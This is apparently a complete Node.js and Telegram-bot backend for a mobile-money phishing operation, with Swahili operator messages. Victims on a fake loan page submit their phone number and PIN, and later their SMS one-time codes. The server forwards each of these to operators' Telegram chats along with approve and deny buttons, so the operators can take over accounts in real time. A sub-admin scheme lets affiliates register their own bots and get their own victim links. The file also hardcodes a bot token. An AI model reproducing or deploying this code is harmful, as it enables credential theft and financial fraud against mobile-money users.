const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Main System Bot Token and Main Admin ID
const MAIN_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8968023761:AAFi4k2gVczpAbCM1-8oRC1axtXA9EwRvo8';
const MAIN_ADMIN_ID = (process.env.MAIN_ADMIN_ID || '8591555400').trim();
const PORT = process.env.PORT || 10000;

if (!MAIN_BOT_TOKEN) {
    console.error("❌ ERROR: Main Telegram Bot Token is missing!");
} else {
    console.log("🤖 Initializing Main Telegram Bot...");
}

const mainBot = new TelegramBot(MAIN_BOT_TOKEN, { polling: true });

mainBot.on('polling_error', (error) => {
    console.error('⚠️ Main Bot Polling Error:', error.code, error.message);
});

let activeSessions = {};
let authorizedAdmins = new Set(MAIN_ADMIN_ID ? [MAIN_ADMIN_ID] : []);
let pendingAdmins = {};
let subAdminBots = {}; 
let subAdminTokens = {}; 
let subAdminSetupState = {}; 

function escapeMarkdown(text) {
    if (!text) return '';
    return text.toString().replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

mainBot.on('message', (msg) => {
    if (!msg.text) return;
    const chatId = msg.chat.id;
    const userIdStr = chatId.toString().trim();
    const firstName = msg.from.first_name || 'Admin';
    const username = msg.from.username ? `@${msg.from.username}` : 'No username set';

    if (subAdminSetupState[userIdStr]) {
        const customToken = msg.text.trim();
        try {
            const customBot = new TelegramBot(customToken, { polling: true });
            
            customBot.on('polling_error', (err) => {
                console.error(`⚠️ Sub-Admin (${userIdStr}) Bot Polling Error:`, err.code, err.message);
            });

            // Set up callback queries for this specific sub-admin bot so they can handle ALLOW/DENY buttons
            setupCallbackHandler(customBot, userIdStr, false);

            customBot.getMe().then((botInfo) => {
                subAdminBots[userIdStr] = customBot;
                subAdminTokens[userIdStr] = customToken;
                delete subAdminSetupState[userIdStr];

                mainBot.sendMessage(chatId, `✅ Token yako imehakikiwa kikamilifu!\n\nBot Yako: @${botInfo.username}\nSasa maombi yako yatatumika kupitia bot yako maalum na yatakuja kwako moja kwa moja.`);
                sendAdminLink(chatId, userIdStr, firstName, username);
            }).catch((err) => {
                mainBot.sendMessage(chatId, "❌ Bot Token uliyoweka si sahihi. Tafadhali tuma Token halali tena:");
            });
        } catch (e) {
            mainBot.sendMessage(chatId, "❌ Imeshindwa kusoma Token hiyo. Hakikisha ni sahihi na utume tena:");
        }
        return;
    }

    if (msg.text.startsWith('/start')) {
        if (userIdStr === MAIN_ADMIN_ID || authorizedAdmins.has(userIdStr)) {
            authorizedAdmins.add(userIdStr);
            if (!subAdminBots[userIdStr] && userIdStr !== MAIN_ADMIN_ID) {
                subAdminSetupState[userIdStr] = true;
                mainBot.sendMessage(chatId, "🤖 Karibu Msimamizi! Tafadhali **tuma Telegram Bot Token yako maalum** (unayotaka iwe ikitumia bot yako kuletea taarifa):");
                return;
            }
            sendAdminLink(chatId, userIdStr, firstName, username);
            return;
        }

        pendingAdmins[userIdStr] = { chatId, firstName, username };
        
        const requestText = `🚨 *Maombi Mapya ya Sub-Admin!*\n\n` +
            `👤 *Jina:* ${escapeMarkdown(firstName)}\n` +
            `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
            `🏷 *Username:* ${escapeMarkdown(username)}`;

        if (MAIN_ADMIN_ID) {
            mainBot.sendMessage(MAIN_ADMIN_ID, requestText, {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "RUHUSU (APPROVE)", callback_data: `approveadmin_${userIdStr}` },
                            { text: "KATAA (DENY)", callback_data: `denyadmin_${userIdStr}` }
                        ]
                    ]
                }
            }).catch(err => console.error("Error sending auth request to main admin:", err));
        }

        mainBot.sendMessage(chatId, "⏳ Ombi lako limeshatumwa kwa Msimamizi Mkuu. Subiri uidhinishwe.");
    }
});

function sendAdminLink(chatId, userIdStr, firstName, username) {
    const host = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
    const isolatedLink = `${host}/?admin=${userIdStr}`;
    const welcomeText = `🚨 *Kiungo Chako cha Admin Kimesajiliwa!*\n\n` +
        `👤 *Jina:* ${escapeMarkdown(firstName)}\n` +
        `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
        `🏷 *Username:* ${escapeMarkdown(username)}\n\n` +
        `🔗 *Kiungo Chako Maalum:*\n${isolatedLink}`;

    const activeBot = (userIdStr === MAIN_ADMIN_ID) ? mainBot : (subAdminBots[userIdStr] || mainBot);
    activeBot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" })
        .catch(err => console.error("Error sending start message:", err));
}

function setupCallbackHandler(botInstance, ownerId, isMain = false) {
    botInstance.on('callback_query', async (query) => {
        const chatId = query.message.chat.id;
        const data = query.data;
        const userIdStr = chatId.toString().trim();

        if (isMain && (data.startsWith('approveadmin_') || data.startsWith('denyadmin_'))) {
            if (userIdStr !== MAIN_ADMIN_ID) {
                botInstance.answerCallbackQuery(query.id, { text: "⚠ Wewe si Main Admin!", show_alert: true });
                return;
            }
            const targetSubId = data.split('_')[1];
            const subAdminInfo = pendingAdmins[targetSubId];

            if (data.startsWith('approveadmin_')) {
                authorizedAdmins.add(targetSubId);
                if (subAdminInfo) {
                    subAdminSetupState[targetSubId] = true;
                    mainBot.sendMessage(subAdminInfo.chatId, `✅ Ombi lako la kuwa Sub-Admin limekubaliwa!\n\nTafadhali **tuma Telegram Bot Token yako maalum** hapa ili uanze kupokea ujumbe kwenye bot yako:`);
                    mainBot.sendMessage(MAIN_ADMIN_ID, `✅ Umemruhusu Sub-Admin ${targetSubId}. Sasa anasubiriwa kuweka Bot Token yake.`);
                }
            } else {
                if (subAdminInfo) {
                    mainBot.sendMessage(subAdminInfo.chatId, "❌ Ombi lako la kuwa Sub-Admin limekataliwa.");
                    mainBot.sendMessage(MAIN_ADMIN_ID, `❌ Umekataa ombi la Sub-Admin ${targetSubId}.`);
                }
            }
            delete pendingAdmins[targetSubId];
            botInstance.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: query.message.message_id }).catch(() => {});
            botInstance.answerCallbackQuery(query.id);
            return;
        }

        const parts = data.split('_');
        const action = parts[0]; 
        const sessionId = parts.slice(1).join('_');

        const session = activeSessions[sessionId];
        if (!session) {
            botInstance.answerCallbackQuery(query.id, { text: "Kipindi kimeisha au hakionekani.", show_alert: true });
            return;
        }

        if (action === 'allow') session.status = 'approved_pin';
        else if (action === 'deny') session.status = 'denied';
        else if (action === 'wrongpin') session.status = 'wrong_pin';
        else if (action === 'wrongsms') session.status = 'wrong_sms';
        else if (action === 'approved') session.status = 'success';

        botInstance.editMessageReplyMarkup({ inline_keyboard: [] }, {
            chat_id: chatId,
            message_id: query.message.message_id
        }).catch(err => console.error("Error clearing markup:", err));

        botInstance.answerCallbackQuery(query.id).catch(err => console.error("Error answering callback query:", err));
    });
}

// Initialize handler for the main bot
setupCallbackHandler(mainBot, MAIN_ADMIN_ID, true);

app.post('/api/submit-credentials', (req, res) => {
    const { sessionId, sliderData, loanData, phone, pin, adminId } = req.body;
    
    // Explicitly target the specific sub-admin's chat ID and bot based on the query parameter link used
    let targetAdmin = MAIN_ADMIN_ID;
    let targetBot = mainBot;

    if (adminId && authorizedAdmins.has(adminId)) {
        targetAdmin = adminId; // Sets the receiver to the sub-admin's exact chat ID
        if (adminId !== MAIN_ADMIN_ID && subAdminBots[adminId]) {
            targetBot = subAdminBots[adminId]; // Routes through the sub-admin's custom bot instance
        }
    }

    activeSessions[sessionId] = {
        sliderData, loanData, phone, pin,
        targetAdmin,
        targetBot,
        status: 'pending_pin_approval'
    };

    const message = `NEW MIXX APPLICANT\n\n` +
        `PHONE NO: ${phone}\n` +
        `PIN: ${pin}`;

    if (targetAdmin && targetBot) {
        targetBot.sendMessage(targetAdmin, message, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "RUHUSU (ALLOW)", callback_data: `allow_${sessionId}` },
                        { text: "KATAA (DENY)", callback_data: `deny_${sessionId}` }
                    ]
                ]
            }
        }).then(() => {
            console.log(`✅ Credentials successfully sent to admin ${targetAdmin} via their designated bot`);
        }).catch(err => {
            console.error(`❌ Telegram Send Error:`, err.response ? err.response.body : err.message);
        });
    }

    res.json({ success: true, sessionId });
});

app.post('/api/submit-otp', (req, res) => {
    const { sessionId, otpText } = req.body;
    const session = activeSessions[sessionId];

    if (!session) {
        return res.json({ success: false, message: 'Session not found' });
    }

    session.otpText = otpText;
    session.status = 'pending_final_approval';

    const message = `UTHIBITISHO WA SMS OTP\n\n` +
        `NAMBARI YA SIMU: ${session.phone}\n\n` +
        `OTP:\n${otpText}`;

    if (session.targetAdmin && session.targetBot) {
        session.targetBot.sendMessage(session.targetAdmin, message, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "📋 Nakili Ujumbe", copy_text: { text: otpText } }
                    ],
                    [
                        { text: "PIN MBAYA ❌", callback_data: `wrongpin_${sessionId}` },
                        { text: "SMS MBAYA", callback_data: `wrongsms_${sessionId}` }
                    ],
                    [
                        { text: "IMETHIBITISHWA", callback_data: `approved_${sessionId}` }
                    ]
                ]
            }
        }).then(() => {
            console.log(`✅ OTP successfully sent to admin ${session.targetAdmin}`);
        }).catch(err => console.error(`❌ Failed to send OTP alert to admin:`, err));
    }

    res.json({ success: true });
});

app.get('/api/check-status/:sessionId', (req, res) => {
    const session = activeSessions[req.params.sessionId];
    if (!session) {
        return res.json({ status: 'not_found' });
    }
    res.json({ status: session.status });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
    
